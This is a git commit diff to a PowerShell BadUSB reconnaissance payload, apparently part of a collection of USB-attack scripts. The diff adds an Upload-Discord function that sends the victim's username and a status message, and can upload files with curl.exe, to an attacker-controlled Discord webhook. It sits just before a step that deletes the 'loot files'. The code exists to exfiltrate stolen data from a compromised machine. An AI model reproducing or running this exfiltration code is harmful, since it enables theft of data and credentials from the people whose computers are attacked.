bc4b2c4b16b00c4a3ce4573d0763db00231cde4d
sealldeveloper <120470330+sealldeveloper@users.noreply.github.com>
2023-03-07 17:50:59 +1100

    Update SeallDEV+jakoby-RECON.ps1

--- badusb/SeallDEV+jakoby-RECON/SeallDEV+jakoby-RECON.ps1
+++ badusb/SeallDEV+jakoby-RECON/SeallDEV+jakoby-RECON.ps1
@@ -2222,12 +2222,30 @@ if ($pers -eq 'Remove') {
 
 $text = "**__Done!__**: Hope you caught something juicy! :pirate_flag:. Cleaning up in the background :broom: ..."
 
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
 $hookurl = "$dc"
 
 $Body = @{
   'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
   'content' = $text
 }
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 
 # Delete loot files 
 
